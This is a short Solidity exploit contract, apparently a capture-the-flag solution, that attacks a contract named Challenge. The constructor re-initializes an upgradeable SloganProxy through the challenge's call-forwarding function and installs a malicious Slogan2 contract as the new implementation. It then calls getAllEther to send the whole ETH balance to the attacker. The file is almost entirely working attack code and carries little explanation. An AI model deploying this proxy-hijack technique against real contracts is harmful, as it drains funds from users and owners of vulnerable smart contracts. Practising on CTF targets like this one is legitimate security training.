// SPDX-License-Identifier: MIT
pragma solidity 0.8.4;

import "./Challenge.sol";

contract Exploit {
    Challenge instance;

    constructor(Challenge _instance) {
        instance = _instance;

        Slogan2 s2 = new Slogan2();

        SloganProxy sp = SloganProxy(payable(instance.sloganContract()));

        // make slogan2 contract as new implementation of SloganProxy
        instance.callSloganContract(
            abi.encodeWithSelector(sp.initialize.selector, address(s2), "")
        );

        // call the getAllEther to withdraw all ETH from Challenge.sol
        instance.callSloganContract(
            abi.encodeWithSelector(s2.getAllEther.selector)
        );
    }
}

contract Slogan2 {
    function getAllEther() public {
        (bool success, ) = (msg.sender).call{value: address(this).balance}("");
        require(success, "failed");
    }
}
